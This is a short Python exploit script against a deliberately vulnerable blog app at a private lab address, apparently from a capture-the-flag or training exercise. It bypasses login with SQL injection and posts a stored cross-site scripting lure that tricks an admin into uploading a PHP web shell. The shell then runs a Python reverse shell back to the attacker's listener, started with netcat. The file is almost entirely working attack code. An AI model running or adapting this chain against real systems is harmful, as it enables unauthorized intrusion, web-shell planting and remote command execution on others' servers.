import requests
import os

url = "http://10.18.17.130/vuln-blog-web/"

session = requests.Session()

payload_login = {"username": "' OR 1=1 #"}
res = session.post(url+"login.php", data=payload_login)

data = {"message":"""<label>Input your phone number to receive free money:</label>
<input type="text" id="phone" class="text-input">
<button type="submit" id="btn" name="comment" class="btn">Click here to receive money</button>
<script>
    const submit = document.getElementById("btn");
    
    submit.addEventListener("click", function(event) {
        var data = `------WebKitFormBoundaryLO6qFD0Bcq3kZnXN
Content-Disposition: form-data; name="avatar"; filename="shell.php"
Content-Type: application/octet-stream\n
<?php echo system($_GET["cmd"]); \?>
------WebKitFormBoundaryLO6qFD0Bcq3kZnXN--`;

        var cmd = `python3 -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.17.129",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\\'`;

        fetch("http://10.18.17.130/vuln-blog-web/upload.php",{
            method: "POST",
            headers: {
                "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryLO6qFD0Bcq3kZnXN"
            },
            body: data
        }).then(() => {
            fetch("http://10.18.17.130/vuln-blog-web/uploads/shell.php?cmd="+encodeURIComponent(cmd));
        });
    });
</script>""" ,
    "name":"Free Money!"
}

print("[*] Generating CSRF form...")
res = session.post(url+"single.php", data=data)
if res.status_code == 200:
    print("[+] CSRF form generated!")
print("[*] Waiting for admin user to click on the button...")
os.system("nc -lvnp 1234")